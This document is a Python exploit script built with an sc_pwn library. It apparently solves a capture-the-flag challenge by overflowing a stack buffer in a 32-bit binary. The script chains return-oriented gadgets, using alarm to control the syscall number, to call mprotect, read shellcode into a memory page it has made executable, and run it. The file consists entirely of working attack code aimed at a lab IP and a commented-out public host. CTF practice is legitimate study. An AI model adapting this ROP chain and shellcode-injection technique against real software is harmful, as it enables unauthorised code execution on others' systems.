#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.129','port':8080}
#target     = {'host':'202.120.7.207','port':52608}

addr_vuln           = 0x0804815a
addr_alarm          = 0x0804810d
addr_read           = 0x0804811d
addr_write          = 0x08048135
addr_exit           = 0x0804814d
addr_syscall_arg3   = 0x08048122
addr_ret            = 0x0804811c
addr_buf            = 0x08049000
addr_shellcode      = addr_buf + 0x400

syscall_mprotect    = 0x7d
addr_str_welcome    = 0x80491bc

#==========
def attack(cmn):
    sc = ShellCode('x86')
    shellcode = sc.write(STDOUT_FILENO, addr_str_welcome, 0x16)
    
    exploit_st1  = '\x00'*0x20
    exploit_st1 += pack_32(addr_ret)
    exploit_st1 += pack_32(addr_ret)
    exploit_st1 += pack_32(addr_alarm)
    exploit_st1 += pack_32(addr_vuln)
    exploit_st1 += pack_32(syscall_mprotect)

    exploit_st2  = '\x00'*0x20
    exploit_st2 += pack_32(addr_ret)
    exploit_st2 += pack_32(addr_vuln+3)
    
    exploit_st3  = '\x00'*0x20
    exploit_st3 += pack_32(addr_alarm)
    exploit_st3 += pack_32(addr_syscall_arg3)
    exploit_st3 += pack_32(addr_vuln)
    exploit_st3 += pack_32(addr_buf)
    exploit_st3 += pack_32(0x1000)

    exploit_st4  = '\x00'*0x20
    exploit_st4 += pack_32(addr_read)
    exploit_st4 += pack_32(addr_shellcode)
    exploit_st4 += pack_32(STDIN_FILENO)
    exploit_st4 += pack_32(addr_shellcode)
    exploit_st4 += pack_32(len(shellcode))

    cmn.read_until('2016!\n')
    cmn.send(exploit_st1)
    cmn.read_until('Good Luck!\n')

    for i in range(6):
        cmn.send(exploit_st2)
        cmn.read_until('Good Luck!\n')

    cmn.send(exploit_st3)
    cmn.read_until('Good Luck!\n')
    cmn.send(exploit_st4)
    cmn.read_until('Good Luck!\n')

    cmn.send(shellcode)
    
    print cmn.read_all()

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)
    del(cmn)

    raw_input('>>')
    
#==========
